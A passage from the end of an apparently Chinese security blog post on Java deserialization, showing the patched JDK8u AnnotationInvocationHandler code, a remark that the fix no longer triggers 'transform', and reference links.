</span></span><span style=display:flex><span>                            value.<span style=color:#a6e22e>getClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;[&#34;</span> <span style=color:#f92672>+</span> value <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;]&#34;</span>).<span style=color:#a6e22e>setMember</span>(
</span></span><span style=display:flex><span>                                annotationType.<span style=color:#a6e22e>members</span>().<span style=color:#a6e22e>get</span>(name));
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            mv.<span style=color:#a6e22e>put</span>(name, value);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        UnsafeAccessor.<span style=color:#a6e22e>setType</span>(<span style=color:#66d9ef>this</span>, t);
</span></span><span style=display:flex><span>        UnsafeAccessor.<span style=color:#a6e22e>setMemberValues</span>(<span style=color:#66d9ef>this</span>, mv);
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p><a href=https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/6f1875b6f29f/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java>https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/6f1875b6f29f/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java</a></p><p>已经不再能够触发 <code>transform</code> 。</p><h2 id=参考>参考</h2><p><a href=https://github.com/Cryin/Paper/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88.md>https://github.com/Cryin/Paper/blob/master/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B%E6%96%B9%E6%A1%88.md</a></p><p><a href=https://xz.aliyun.com/t/7031#toc-10>https://xz.aliyun.com/t/7031#toc-10</a></p></article></div></main></body></html>